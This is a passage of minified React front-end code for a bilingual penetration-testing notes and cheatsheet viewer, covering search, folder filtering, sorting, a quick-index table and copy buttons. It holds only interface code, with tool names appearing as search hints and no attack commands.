dark:text-purple-400 border border-slate-300 dark:border-cyber-border text-[9px] font-mono hover:text-purple-900 dark:hover:text-white transition-colors cursor-pointer",title:"Collapse all folders",children:"- All"}),e.jsxs("button",{type:"button",onClick:()=>o(!0),className:"px-2 py-0.5 rounded bg-purple-600 hover:bg-purple-700 text-white border border-purple-500 text-[10px] font-bold transition-all flex items-center gap-1 cursor-pointer flex-shrink-0 shadow-sm",title:"Create custom field manual note",children:[e.jsx(je,{className:"w-3 h-3"}),e.jsx("span",{children:"Note"})]})]})]}),e.jsxs(re.button,{whileHover:{x:3},whileTap:{scale:.98},onClick:()=>{x(null),ie("ALL"),V("ALL"),ae(30)},className:`w-full flex items-center justify-between px-2.5 py-1.5 rounded-lg text-xs transition-all text-left cursor-pointer ${d===null&&N==="ALL"?"bg-purple-100 dark:bg-purple-500/20 text-purple-900 dark:text-purple-300 border border-purple-300 dark:border-purple-500/40 font-bold shadow-md":"text-slate-600 dark:text-cyber-muted hover:text-purple-900 dark:hover:text-white hover:bg-slate-100 dark:hover:bg-cyber-bg border border-transparent"}`,children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(K,{className:"w-3.5 h-3.5 text-purple-400"}),e.jsx("span",{children:"All Field Notes"})]}),e.jsx("span",{className:"text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-200 dark:bg-black/40 border border-slate-300 dark:border-cyber-border text-slate-800 dark:text-purple-300",children:P.length})]}),F.length>0&&e.jsxs("button",{type:"button",onClick:bt,className:"w-full p-1.5 px-2 rounded-lg bg-rose-950/30 border border-rose-800/40 hover:bg-rose-900/40 text-rose-300 text-[10px] font-bold flex items-center justify-between transition-colors cursor-pointer",title:"Click to restore all deleted field notes",children:[e.jsxs("span",{children:["↺ ",F.length," Deleted Notes"]}),e.jsx("span",{className:"underline",children:"Restore"})]}),e.jsx("div",{className:"space-y-0.5 max-h-[65vh] overflow-y-auto pr-1 scrollbar-thin",children:qe.length===0?e.jsxs("div",{className:"p-4 rounded-lg bg-purple-50/70 dark:bg-cyber-card/40 border border-purple-200 dark:border-cyber-border text-center space-y-2.5 my-2",children:[e.jsx(_e,{className:"w-8 h-8 text-purple-600 dark:text-purple-400/60 mx-auto"}),e.jsx("div",{className:"text-xs font-bold text-slate-900 dark:text-white",children:"Vault Empty (0 Notes)"}),e.jsx("p",{className:"text-[10px] text-slate-600 dark:text-cyber-muted",children:"Import your notes directory from disk or create a custom note."}),e.jsxs("div",{className:"flex flex-col gap-1.5 pt-1",children:[e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),Z(!0)},className:"w-full py-1.5 px-2.5 rounded bg-purple-600 hover:bg-purple-500 text-white font-bold text-[10px] transition-all flex items-center justify-center gap-1.5 cursor-pointer shadow-sm",children:[e.jsx(_e,{className:"w-3 h-3"}),e.jsx("span",{children:"Import Notes Directory"})]}),e.jsxs("button",{type:"button",onClick:()=>{H(void 0),o(!0),u&&p("click")},className:"w-full py-1.5 px-2.5 rounded bg-white hover:bg-purple-50 dark:bg-cyber-bg dark:hover:bg-cyber-card text-purple-900 dark:text-purple-300 border border-purple-300 dark:border-purple-500/30 text-[10px] transition-all flex items-center justify-center gap-1.5 cursor-pointer",children:[e.jsx(je,{className:"w-3 h-3"}),e.jsx("span",{children:"Create Custom Note"})]})]})]}):qe.map(t=>e.jsx(jt,{node:t,depth:0,expandedFolders:k,onToggleFolder:Et,selectedPath:d,onSelectFolder:Lt,onSelectNote:s=>{u&&p("click"),te(s)},onDeleteNote:Fe,onAddNoteToFolder:s=>{H(s),o(!0),u&&p("click")},cptsLangMode:y},t.id))}),e.jsx("div",{className:"pt-2 border-t border-cyber-border/70",children:e.jsxs("button",{type:"button",onClick:()=>{Y("tactical"),Le("")},className:"w-full px-3 py-2 rounded-lg border border-cyber-border text-cyber-muted hover:text-white hover:bg-cyber-bg text-xs flex items-center gap-2 transition-all cursor-pointer",children:[e.jsx(he,{className:"w-3.5 h-3.5 text-cyber-cyan"}),e.jsx("span",{children:"← Back to Tactical Snippets"})]})})]})]})}),e.jsxs("div",{className:"lg:col-span-3 space-y-4",children:[e.jsx("div",{className:"flex items-center gap-3",children:e.jsxs("div",{className:"relative flex-1",children:[e.jsx(Je,{className:"absolute left-3 top-2.5 w-4 h-4 text-cyber-muted"}),e.jsx("input",{type:"text",id:"cheatsheet-search-input",name:"cheatsheet-search","aria-label":"Search cheatsheets and field manual notes",value:ye,onChange:t=>{Le(t.target.value),ae(30)},placeholder:M==="tactical"?"Search commands, flags, tools (e.g. nmap, ffuf, bloodhound, impacket)...":P.length>0?`Search ${P.length} field manual notes, tags, summaries, and commands (e.g. kerberoast, suid, bloodhound)...`:"Search field manual notes and commands...",className:"w-full pl-9 pr-4 py-2 bg-white dark:bg-cyber-card border border-slate-300 dark:border-cyber-border rounded-lg text-xs text-slate-900 dark:text-white placeholder:text-slate-400 dark:placeholder-cyber-muted focus:outline-none focus:border-cyan-500 transition-all shadow-sm"}),ye&&e.jsx("button",{onClick:()=>Le(""),className:"absolute right-3 top-2.5 text-xs text-cyber-muted hover:text-white",children:"✕"})]})}),M==="tactical"&&e.jsxs(e.Fragment,{children:[(W==="all"||W==="revshell")&&!ye&&e.jsx(Pr,{}),e.jsx("div",{className:"space-y-3",children:ut.length===0?e.jsx("div",{className:"p-8 text-center rounded-xl border border-dashed border-cyber-border bg-cyber-card/50 text-cyber-muted text-xs",children:"No command snippets matching this query."}):ut.map((t,s)=>{const l=fe(t.commandTemplate,g),_=we===t.id;return e.jsxs(re.div,{initial:{opacity:0,y:15},whileInView:{opacity:1,y:0},viewport:{once:!0,margin:"-30px"},transition:{duration:.25,delay:Math.min(s%10*.04,.3)},whileHover:{y:-2},className:"p-3.5 rounded-xl border border-cyber-border bg-cyber-card hover:border-cyber-cyan/40 hover:shadow-glow-cyan/15 transition-all shadow-sm group",children:[e.jsxs("div",{className:"flex items-start justify-between gap-2 mb-1.5",children:[e.jsxs("div",{children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("span",{className:"font-bold text-slate-900 dark:text-white text-sm group-hover:text-cyber-cyan transition-colors",children:t.title}),t.isCustom&&e.jsx("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-cyber-purple/10 border border-cyber-purple/30 text-cyber-purple font-semibold",children:"CUSTOM"}),t.platform&&e.jsx("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-cyber-bg border border-cyber-border text-cyber-muted",children:t.platform})]}),e.jsx("p",{className:"text-[11px] text-cyber-muted mt-0.5",children:t.description})]}),e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx(re.button,{whileHover:{scale:1.15},whileTap:{scale:.9},onClick:()=>U(t.id),className:"p-1 rounded text-cyber-muted hover:text-cyber-amber transition-colors",title:"Bookmark / Star Snippet",children:e.jsx(ft,{className:`w-3.5 h-3.5 ${t.isStarred?"fill-cyber-amber text-cyber-amber":""}`})}),t.isCustom&&e.jsx(re.button,{whileHover:{scale:1.15},whileTap:{scale:.9},onClick:()=>ne(t.id),className:"p-1 rounded text-cyber-muted hover:text-cyber-crimson transition-colors",title:"Delete Snippet",children:e.jsx(Se,{className:"w-3.5 h-3.5"})}),e.jsx(re.button,{whileHover:{scale:1.05},whileTap:{scale:.95},onClick:()=>Ee(l,t.id),className:`flex items-center gap-1 px-2.5 py-1 rounded text-xs font-semibold transition-all ${_?"bg-cyber-emerald/20 text-cyber-emerald border border-cyber-emerald shadow-glow-emerald/30":"bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white hover:border-cyber-cyan"}`,children:_?e.jsxs(e.Fragment,{children:[e.jsx(de,{className:"w-3 h-3 text-cyber-emerald"}),e.jsx("span",{className:"text-cyber-emerald",children:"Copied!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(ce,{className:"w-3 h-3"}),e.jsx("span",{children:"Copy"})]})})]})]}),e.jsx("div",{className:"relative",children:e.jsx("pre",{className:"p-3 rounded-lg bg-cyber-code border border-cyber-border text-xs text-white overflow-x-auto whitespace-pre-wrap break-all font-mono select-all",children:l})}),t.tags.length>0&&e.jsx("div",{className:"flex flex-wrap gap-1 mt-2",children:t.tags.map(O=>e.jsxs("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan",children:["#",O]},O))})]},t.id)})})]}),M==="cpts-manual"&&e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-3.5 rounded-xl border border-purple-200 dark:border-purple-500/30 bg-purple-50/60 dark:bg-purple-950/20 space-y-3 text-xs",children:[e.jsxs("div",{className:"flex flex-wrap items-center justify-between gap-3",children:[e.jsxs("div",{className:"flex items-center gap-2 flex-wrap",children:[e.jsx(K,{className:"w-4 h-4 text-purple-400"}),e.jsx("span",{className:"text-slate-900 dark:text-white font-bold tracking-wide",children:"OFFENSIVE FIELD MANUAL & CHEATS"}),e.jsx("span",{className:"text-[10px] px-2 py-0.5 rounded bg-purple-100 dark:bg-purple-500/20 text-purple-900 dark:text-purple-300 font-mono",children:N==="ALL"?P.length>0?`ALL NOTES (${P.length})`:"VAULT EMPTY (0 NOTES)":N.toUpperCase()}),w!=="ALL"&&e.jsxs("span",{className:"text-[10px] px-2 py-0.5 rounded bg-purple-100 dark:bg-purple-600/30 border border-purple-300 dark:border-purple-400/40 text-purple-900 dark:text-purple-200 font-mono flex items-center gap-1",children:[e.jsxs("span",{children:["📁 ",w]}),e.jsx("button",{type:"button",onClick:()=>V("ALL"),className:"hover:text-purple-950 dark:hover:text-white text-purple-700 dark:text-purple-300 ml-1 font-bold",title:"Clear subcategory filter",children:"✕"})]})]}),e.jsxs("div",{className:"flex items-center gap-2 flex-wrap",children:[e.jsxs("div",{className:"relative",children:[e.jsxs("button",{type:"button",onClick:()=>ee(t=>!t),className:"px-2.5 py-1 rounded-lg bg-white dark:bg-cyber-bg border border-purple-300 dark:border-purple-500/40 text-purple-900 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white hover:border-purple-400 text-xs flex items-center gap-1.5 font-semibold transition-all shadow-sm",title:"Quick search and jump to any note directly",children:[e.jsx(Je,{className:"w-3.5 h-3.5 text-purple-400"}),e.jsx("span",{children:"Jump to Note..."}),e.jsx(He,{className:"w-3 h-3 text-purple-400"})]}),I&&e.jsxs(e.Fragment,{children:[e.jsx("div",{className:"fixed inset-0 z-40",onClick:()=>ee(!1)}),e.jsxs("div",{className:"absolute right-0 top-full mt-1.5 w-80 max-h-96 rounded-xl border border-purple-500/50 bg-cyber-card/95 backdrop-blur-md shadow-2xl p-2 z-50 space-y-2 animate-fade-in font-mono",children:[e.jsx("input",{id:"cpts-jump-search-input",name:"cpts-jump-search","aria-label":"Type note name, tag, or tool",type:"text",autoFocus:!0,value:z,onChange:t=>Oe(t.target.value),placeholder:"Type note name, tag, or tool...",className:"w-full bg-slate-50 dark:bg-cyber-bg px-2.5 py-1.5 rounded-lg border border-purple-300 dark:border-purple-500/40 text-slate-900 dark:text-white text-xs focus:outline-none focus:border-purple-400"}),e.jsx("div",{className:"max-h-72 overflow-y-auto space-y-1 divide-y divide-cyber-border/30",children:(z.trim()?P:J).filter(t=>{if(!z.trim())return!0;const s=z.toLowerCase();return t.title.toLowerCase().includes(s)||t.titleEn&&t.titleEn.toLowerCase().includes(s)||t.titleHe&&t.titleHe.toLowerCase().includes(s)||t.subCategory&&t.subCategory.toLowerCase().includes(s)||t.tools&&t.tools.some(l=>l.toLowerCase().includes(s))}).slice(0,40).map(t=>e.jsxs("div",{className:"flex items-center gap-1 w-full rounded hover:bg-purple-900/40 transition-all p-1 group",children:[e.jsxs("button",{type:"button",onClick:()=>{ee(!1),te(t),u&&p("root")},className:"flex-1 text-left px-1.5 py-1 rounded transition-all flex flex-col min-w-0 cursor-pointer",title:"Open full Obsidian note",children:[e.jsxs("div",{className:"flex items-center justify-between gap-1",children:[e.jsx("span",{className:"text-slate-900 dark:text-white text-xs font-bold group-hover:text-purple-600 dark:group-hover:text-purple-300 truncate flex-1",children:t.titleEn||t.title}),e.jsx("span",{className:"text-[9px] font-mono px-1 rounded bg-black/40 text-purple-400 flex-shrink-0",children:t.category.split(" ")[0]})]}),e.jsx("span",{className:"text-[10px] text-cyber-muted truncate block",children:t.subCategory||t.category})]}),e.jsx("button",{type:"button",onClick:()=>Ht(t),className:"px-2 py-1 rounded bg-black/50 border border-purple-500/30 text-purple-300 hover:text-white hover:bg-purple-900/60 text-[10px] font-mono flex-shrink-0 cursor-pointer",title:"Scroll to note in page",children:"Jump"})]},t.id))})]})]})]}),e.jsxs("div",{className:"flex items-center gap-1 bg-slate-100 dark:bg-cyber-bg/90 p-1 rounded-lg border border-purple-300 dark:border-purple-500/30 text-xs",children:[e.jsxs("button",{type:"button",onClick:()=>{se("number"),x(null),ie("ALL"),V("ALL"),ae(30),u&&p("click")},className:`px-2.5 py-1 rounded text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${f==="number"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Sort notes strictly by numerical sequence (00.01 to 06.xx) flat across all folders",children:[e.jsx(lr,{className:"w-3.5 h-3.5 text-amber-400"}),e.jsx("span",{children:"Number Order"})]}),e.jsxs("button",{type:"button",onClick:()=>{se("topic"),ae(30),u&&p("click")},className:`px-2 py-1 rounded text-xs font-bold transition-all flex items-center gap-1 cursor-pointer ${f==="topic"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Group and filter by topic folders",children:[e.jsx(Re,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"By Topic"})]}),e.jsxs("button",{type:"button",onClick:()=>{se("title"),ae(30),u&&p("click")},className:`px-2 py-1 rounded text-xs font-bold transition-all flex items-center gap-1 cursor-pointer ${f==="title"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Sort notes alphabetically by title",children:[e.jsx(ir,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"A → Z"})]})]}),e.jsxs("div",{className:"flex items-center gap-1 bg-slate-100 dark:bg-cyber-bg/90 p-1 rounded-lg border border-purple-300 dark:border-purple-500/30 text-xs",children:[e.jsxs("button",{type:"button",onClick:()=>h("cards"),className:`px-2 py-0.5 rounded text-xs font-bold transition-all flex items-center gap-1 ${T==="cards"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Detailed cards view with expanded summaries and code blocks",children:[e.jsx(cr,{className:"w-3.5 h-3.5"}),e.jsx("span",{className:"hidden sm:inline",children:"Cards"})]}),e.jsxs("button",{type:"button",onClick:()=>h("quick-index"),className:`px-2 py-0.5 rounded text-xs font-bold transition-all flex items-center gap-1 ${T==="quick-index"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Ultra-compact terminal index table - view 50+ notes without scrolling",children:[e.jsx(dr,{className:"w-3.5 h-3.5"}),e.jsx("span",{className:"hidden sm:inline",children:"Quick Index"})]}),e.jsxs("button",{type:"button",onClick:()=>h("grouped"),className:`px-2 py-0.5 rounded text-xs font-bold transition-all flex items-center gap-1 ${T==="grouped"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Grouped by Obsidian topic folders",children:[e.jsx(Re,{className:"w-3.5 h-3.5"}),e.jsx("span",{className:"hidden sm:inline",children:"Grouped"})]})]}),e.jsxs("div",{className:"flex items-center gap-1 bg-slate-100 dark:bg-cyber-bg/90 p-1 rounded-lg border border-purple-300 dark:border-purple-500/30 text-xs",children:[e.jsx("button",{type:"button","data-testid":"cpts-lang-en",onClick:()=>{u&&p("click"),me("en")},className:`px-2.5 py-1 rounded text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${y==="en"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"English notes only",children:e.jsx("span",{children:"🇬🇧 EN"})}),e.jsx("button",{type:"button","data-testid":"cpts-lang-he",onClick:()=>{u&&p("click"),me("he")},className:`px-2.5 py-1 rounded text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${y==="he"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"עברית בלבד",children:e.jsx("span",{children:"🇮🇱 עב"})})]}),e.jsxs("div",{className:"flex items-center gap-1 bg-slate-100 dark:bg-cyber-bg/90 p-1 rounded-lg border border-purple-300 dark:border-purple-500/30 text-xs",children:[e.jsx("button",{type:"button",onClick:()=>Ge("auto"),className:`px-2 py-0.5 rounded text-xs font-bold transition-all ${ue==="auto"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Auto direction based on language",children:e.jsx("span",{children:"Auto"})}),e.jsx("button",{type:"button",onClick:()=>Ge("ltr"),className:`px-2 py-0.5 rounded text-xs font-bold transition-all ${ue==="ltr"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Force Left-to-Right layout",children:e.jsx("span",{children:"LTR ➔"})}),e.jsx("button",{type:"button",onClick:()=>Ge("rtl"),className:`px-2 py-0.5 rounded text-xs font-bold transition-all ${ue==="rtl"?"bg-purple-600 text-white shadow-md shadow-purple-600/40":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:"Force Right-to-Left layout (עברית)",children:e.jsx("span",{children:"⬅️ RTL"})})]})]})]}),d&&e.jsxs("div",{className:"flex items-center justify-between p-2 px-3 rounded-lg bg-purple-100 dark:bg-purple-950/40 border border-purple-300 dark:border-purple-500/40 text-xs",children:[e.jsxs("div",{className:"flex items-center gap-2 text-purple-900 dark:text-purple-200 truncate",children:[e.jsx(_e,{className:"w-4 h-4 text-purple-600 dark:text-purple-400 flex-shrink-0"}),e.jsxs("span",{className:"truncate",children:["Folder: ",e.jsx("strong",{className:"text-slate-900 dark:text-white font-mono",children:((gt=d.split("/").pop())==null?void 0:gt.replace(/^\d+[\s_.-]*/,""))||d})," (",e.jsxs("strong",{className:"text-purple-900 dark:text-purple-300",children:[J.length," notes"]}),")"]})]}),e.jsx("button",{type:"button",onClick:()=>x(null),className:"text-[10px] text-purple-700 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white underline font-semibold flex-shrink-0 cursor-pointer ml-2",children:"✕ Clear Filter"})]}),Ie.length>0&&e.jsxs("div",{className:"space-y-1.5 pt-1 border-t border-purple-900/30",children:[e.jsxs("div",{className:"flex items-center gap-1.5 overflow-x-auto pb-1 scrollbar-thin",children:[e.jsxs("span",{className:"text-[10px] text-purple-400 font-bold uppercase tracking-wider flex-shrink-0 flex items-center gap-1",children:[e.jsx(pr,{className:"w-3 h-3"}),e.jsx("span",{children:"TOPICS:"})]}),e.jsxs("button",{type:"button",onClick:()=>{V("ALL"),ae(30)},className:`px-2.5 py-0.5 rounded-full text-xs font-semibold flex-shrink-0 transition-all ${w==="ALL"?"bg-purple-600 text-white shadow-sm":"bg-slate-100 dark:bg-cyber-bg border border-slate-300 dark:border-cyber-border text-slate-700 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,children:["ALL (",J.length,")"]}),Ie.map(t=>{const s=w===t.group;return e.jsxs("button",{type:"button",onClick:()=>{V(s?"ALL":t.group),ae(30)},className:`px-2.5 py-0.5 rounded-full text-xs font-semibold flex-shrink-0 transition-all flex items-center gap-1.5 ${s?"bg-purple-600 text-white shadow-md shadow-purple-600/40 border border-purple-400":"bg-slate-100 dark:bg-cyber-bg border border-slate-300 dark:border-cyber-border text-slate-700 dark:text-cyber-muted hover:text-purple-900 dark:hover:text-purple-200 hover:border-purple-400"}`,children:[e.jsxs("span",{children:["📁 ",t.group]}),e.jsx("span",{className:`text-[9px] px-1 rounded-full ${s?"bg-purple-800 text-white":"bg-slate-200 dark:bg-black/30 text-purple-900 dark:text-purple-300"}`,children:t.count})]},t.group)})]}),w!=="ALL"&&xt.length>1&&e.jsxs("div",{className:"flex items-center gap-1.5 overflow-x-auto pb-0.5 pl-6 scrollbar-thin",children:[e.jsx("span",{className:"text-[9px] text-cyber-muted font-mono flex-shrink-0",children:"SUB-LEAVES:"}),xt.map(t=>e.jsxs("button",{type:"button",onClick:()=>{V(t.leaf),ae(30)},className:"px-2 py-0.2 rounded text-[10px] font-mono bg-purple-100 dark:bg-purple-950/40 border border-purple-300 dark:border-purple-800/40 text-purple-900 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white hover:border-purple-400 transition-all flex-shrink-0",children:[t.leaf," (",t.count,")"]},t.leaf))]})]}),e.jsxs("div",{className:"flex items-center justify-between text-[11px] text-cyber-muted font-mono pt-1",children:[e.jsxs("div",{children:["Showing ",e.jsx("strong",{className:"text-purple-800 dark:text-purple-300",children:ve.length})," of ",e.jsx("strong",{className:"text-slate-900 dark:text-white",children:J.length})," notes (",e.jsx("strong",{className:"text-cyber-cyan",children:Ot})," total commands)"]}),T==="quick-index"&&e.jsx("span",{className:"text-purple-400 text-[10px]",children:"⚡ Terminal Quick Index Active · 1-Click Inline Command Expansion"})]})]}),T==="quick-index"&&e.jsx("div",{className:"rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg",children:e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"w-full text-left text-xs font-mono",children:[e.jsx("thead",{className:"bg-cyber-bg/95 border-b border-cyber-border text-cyber-muted text-[10px] uppercase tracking-wider sticky top-0 z-10 backdrop-blur",children:e.jsxs("tr",{children:[e.jsx("th",{className:"py-2.5 px-3 w-12 text-center",children:"#"}),e.jsx("th",{className:"py-2.5 px-3 w-48",children:"TOPIC / FOLDER"}),e.jsx("th",{className:"py-2.5 px-3",children:"TITLE / OBJECTIVE"}),e.jsx("th",{className:"py-2.5 px-3 w-28 text-center",children:"STAGE / LEVEL"}),e.jsx("th",{className:"py-2.5 px-3 w-32 text-center",children:"COMMANDS"}),e.jsx("th",{className:"py-2.5 px-3 w-28 text-right pr-4",children:"ACTIONS"})]})}),e.jsx("tbody",{className:"divide-y divide-cyber-border/40",children:P.length===0?e.jsx("tr",{children:e.jsx("td",{colSpan:6,className:"p-8 text-center",children:e.jsxs("div",{className:"space-y-3 max-w-md mx-auto",children:[e.jsx("div",{className:"text-slate-900 dark:text-white font-bold text-sm",children:"Vault Empty (0 Notes Loaded)"}),e.jsx("p",{className:"text-slate-600 dark:text-cyber-muted text-xs",children:"ZeroBox keeps notes 100% client-side in browser IndexedDB. Import your personal Obsidian notes JSON to populate this quick index."}),e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),Z(!0)},className:"px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-lg text-xs font-mono inline-flex items-center gap-2 transition-all cursor-pointer shadow-md",children:[e.jsx(Pe,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Import Notes Vault (.json)"})]})]})})}):ve.length===0?e.jsx("tr",{children:e.jsxs("td",{colSpan:6,className:"p-8 text-center text-slate-600 dark:text-cyber-muted text-xs",children:['No field manual notes matching "',ye,'".']})}):ve.map((t,s)=>{const l=!!b[t.id],{group:_,leaf:O}=Ae(t.subCategory),be=De===t.id,q=ue==="rtl"||ue==="auto"&&y==="he";return e.jsxs(Nt.Fragment,{children:[e.jsxs("tr",{id:`cpts-note-${t.id}`,className:`transition-colors hover:bg-purple-950/20 ${be?"bg-purple-500/25 ring-1 ring-purple-400":s%2===0?"bg-cyber-card/50":"bg-cyber-bg/30"}`,children:[e.jsx("td",{className:"py-2.5 px-3 text-center text-cyber-muted text-[11px] font-mono",children:String(s+1).padStart(2,"0")}),e.jsxs("td",{className:"py-2.5 px-3 font-mono",children:[e.jsxs("div",{className:"text-[11px] text-purple-800 dark:text-purple-300 font-semibold truncate max-w-[180px]",title:t.subCategory||_,children:["📁 ",_]}),O&&O!==_&&e.jsxs("div",{className:"text-[9px] text-cyber-muted truncate max-w-[180px]",children:["› ",O]})]}),e.jsx("td",{className:"py-2.5 px-3",children:e.jsxs("div",{dir:q?"rtl":"ltr",className:q?"text-right":"text-left",children:[e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),te(t)},className:"font-bold text-slate-900 dark:text-white text-xs hover:text-purple-600 dark:hover:text-purple-300 transition-colors inline-flex items-center gap-1.5 cursor-pointer text-left",title:y==="he"?"פתח הערה באובסידיאן":"Open authentic Obsidian note",dir:y==="he"?"rtl":"ltr",children:[e.jsx(K,{className:"w-3.5 h-3.5 text-purple-600 dark:text-purple-400 flex-shrink-0"}),e.jsx("span",{children:y==="he"?t.titleHe||t.title:t.titleEn||t.title}),Ne(t)&&e.jsxs("span",{className:"text-[9px] px-1 py-0.2 rounded bg-amber-100 text-amber-800 dark:bg-amber-500/15 dark:text-amber-300 border border-amber-300 dark:border-amber-500/30 font-mono font-bold",children:["#",Ne(t)]})]}),e.jsx("div",{className:`text-[10px] text-cyber-muted truncate max-w-md mt-0.5 ${y==="he"?"font-sans text-right":"text-left"}`,dir:y==="he"?"rtl":"ltr",children:y==="he"?t.heSummary||t.summary||t.subCategory:t.enSummary||t.summary||t.subCategory})]})}),e.jsx("td",{className:"py-2.5 px-3 text-center",children:t.stage?e.jsx("span",{className:"text-[9px] px-1.5 py-0.5 rounded bg-blue-100 dark:bg-blue-500/15 text-blue-800 dark:text-blue-300 border border-blue-300 dark:border-blue-500/30",children:t.stage}):e.jsx("span",{className:"text-[9px] px-1.5 py-0.5 rounded bg-cyber-bg border border-cyber-border text-cyber-muted",children:t.difficulty||"Core"})}),e.jsx("td",{className:"py-2.5 px-3 text-center",children:t.commands&&t.commands.length>0?e.jsx("button",{type:"button",onClick:()=>m(xe=>({...xe,[t.id]:!xe[t.id]})),className:`px-2 py-1 rounded text-[11px] font-bold transition-all inline-flex items-center gap-1 ${l?"bg-purple-600 text-white shadow-sm":"bg-purple-100 dark:bg-purple-950/50 border border-purple-300 dark:border-purple-800/50 text-purple-800 dark:text-purple-300 hover:bg-purple-200 dark:hover:bg-purple-900/60"}`,children:e.jsxs("span",{children:[l?"▴":"▾"," ",t.commands.length," cmd",t.commands.length>1?"s":""]})}):e.jsx("span",{className:"text-cyber-muted text-[10px]",children:"Doc only"})}),e.jsx("td",{className:"py-2.5 px-3 text-right pr-4",children:e.jsxs("div",{className:"flex items-center justify-end gap-1.5",children:[e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),te(t)},className:"px-2 py-1 rounded text-[10px] font-semibold bg-purple-100 dark:bg-purple-950/50 border border-purple-300 dark:border-purple-800/50 text-purple-800 dark:text-purple-300 hover:text-purple-950 dark:hover:text-white hover:bg-purple-200 dark:hover:bg-purple-900/60 transition-all inline-flex items-center gap-1 cursor-pointer",title:"Open Obsidian personal note",children:[e.jsx(K,{className:"w-2.5 h-2.5"}),e.jsx("span",{children:"Note"})]}),t.commands&&t.commands.length>0&&e.jsx("button",{type:"button",onClick:()=>ze(t),className:`px-2 py-1 rounded text-[10px] font-semibold transition-all inline-flex items-center gap-1 cursor-pointer ${we===`all-${t.id}`?"bg-cyber-emerald/20 text-cyber-emerald border border-cyber-emerald":"bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white hover:border-purple-400"}`,title:"Copy all commands in note",children:we===`all-${t.id}`?e.jsxs(e.Fragment,{children:[e.jsx(de,{className:"w-3 h-3 text-cyber-emerald"}),e.jsx("span",{children:"Copied"})]}):e.jsxs(e.Fragment,{children:[e.jsx(ce,{className:"w-3 h-3"}),e.jsx("span",{children:"Copy All"})]})}),e.jsx("button",{type:"button",onClick:()=>Fe(t.id,t.titleEn||t.title),className:"p-1 rounded text-cyber-muted hover:text-cyber-crimson hover:bg-rose-950/40 transition-colors cursor-pointer",title:"Delete field note",children:e.jsx(Se,{className:"w-3 h-3"})})]})})]}),l&&t.commands&&t.commands.length>0&&e.jsx("tr",{className:"bg-black/60 border-y border-purple-900/40",children:e.jsxs("td",{colSpan:6,className:"p-3 pl-10 pr-4 space-y-2",children:[e.jsxs("div",{className:"flex items-center justify-between text-[10px] text-purple-400 font-bold border-b border-purple-900/30 pb-1",children:[e.jsxs("span",{children:["COMMANDS FOR: ",t.titleEn||t.title]}),e.jsxs("span",{children:[t.commands.length," EXECUTABLES"]})]}),e.jsx("div",{className:"space-y-1.5",dir:"ltr",children:t.commands.map((xe,ge)=>{const ke=fe(xe,g),Te=`${t.id}-${ge}`,Ye=we===Te;return e.jsxs("div",{className:"flex items-center justify-between gap-2 p-1.5 px-2 rounded bg-cyber-code border border-purple-900/30 text-xs font-mono",children:[e.jsx("pre",{className:"text-cyber-cyan overflow-x-auto whitespace-pre-wrap break-all flex-1 select-all",children:ke}),e.jsxs("button",{type:"button",onClick:()=>Ee(ke,Te),className:`flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-semibold flex-shrink-0 transition-all ${Ye?"bg-cyber-emerald/20 text-cyber-emerald border border-cyber-emerald":"bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white hover:border-cyber-cyan"}`,children:[Ye?e.jsx(de,{className:"w-2.5 h-2.5 text-cyber-emerald"}):e.jsx(ce,{className:"w-2.5 